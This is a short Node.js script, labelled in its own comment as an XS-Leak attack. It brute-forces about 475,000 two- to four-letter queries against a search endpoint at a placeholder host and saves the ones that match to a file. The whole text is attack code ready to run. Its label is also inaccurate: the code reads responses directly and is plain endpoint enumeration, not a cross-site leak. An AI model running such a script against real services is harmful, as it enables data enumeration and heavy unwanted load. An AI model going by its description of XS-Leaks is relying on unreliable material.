const fs = require('fs');

const characters = 'abcdefghijklmnopqrstuvwxyz'; 
const combinationLengths = [2, 3, 4]; 
const outputFile = 'hit_combinations.txt';

async function performSearch(query) {
  return new Promise((resolve, reject) => {
    fetch('https://example.com/search', {
      method: 'POST',
      body: JSON.stringify({ query }),
      headers: {
        'Content-Type': 'application/json'
      }
    })
      .then((response) => response.json())
      .then((data) => {
        const hit = data.result === 'success'; 
        console.log(`Query: ${query}, Result: ${hit}`);
        resolve(hit);
      })
      .catch((error) => {
        console.error('Performing search error:', error);
        reject(error);
      });
  });
}

function generateCombinations(lengths) {
  const combinations = [];

  function backtrack(combination, length) {
    if (combination.length === length) {
      combinations.push(combination);
      return;
    }

    for (let i = 0; i < characters.length; i++) {
      const nextChar = characters[i];
      backtrack(combination + nextChar, length);
    }
  }

  lengths.forEach((length) => {
    backtrack('', length);
  });

  return combinations;
}

function saveCombinationsToFile(combinations, fileName) {
  const data = combinations.join('\n');

  fs.writeFile(fileName, data, (err) => {
    if (err) {
      throw err;
    }

    console.log(`Hit combinations saved to ${fileName}`);
  });
}

async function runXSLeakAttack() {
  const allCombinations = generateCombinations(combinationLengths);
  const hitCombinations = [];

  for (const combination of allCombinations) {
    const hit = await performSearch(combination);
    if (hit) {
      hitCombinations.push(combination);
    }
  }

  saveCombinationsToFile(hitCombinations, outputFile);
}

// Start XS-Leak attack
runXSLeakAttack();